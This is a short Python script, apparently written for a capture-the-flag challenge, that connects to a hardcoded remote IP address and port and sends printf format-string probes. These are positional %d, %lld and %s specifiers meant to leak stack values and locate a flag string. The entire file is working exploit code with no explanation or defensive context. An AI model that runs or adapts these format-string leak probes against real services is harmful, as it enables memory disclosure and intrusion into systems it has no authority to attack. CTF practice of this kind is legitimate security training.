#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642

def conn():
    s=socket.socket(); s.settimeout(1.5); s.connect((HOST,PORT)); s.recv(300); return s

def test(txt):
    try:
        s=conn()
        s.send(txt)
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception as e:
        return b'ERR:'+str(e).encode()

# positional args
print("=== positional ===")
for spec in ["%1$d","%2$d","%3$d","%1$s","%2$s","%1$lld","%2$lld"]:
    print(spec, "=>", repr(test((spec+"\n").encode())))
    time.sleep(0.1)

# leak sequential %d values via one connection (each printf reads arg1, but try)
print("=== %lld%d chain ===")
for spec in ["%lld.%lld.%lld.%lld.%lld",
             "%d.%d.%d.%d.%d.%d.%d",
             "%lld","%d"]:
    print(spec, "=>", repr(test((spec+"\n").encode())))
    time.sleep(0.1)

# %s with various args (if positional works) to find flag string
print("=== %s probes ===")
for spec in ["%1$s","%2$s","%3$s","%4$s","%5$s","%6$s","%7$s","%8$s","%9$s","%10$s","%11$s","%12$s","%13$s","%14$s","%15$s"]:
    r=test((spec+"\n").encode())
    print(spec, "=>", repr(r))
    time.sleep(0.08)
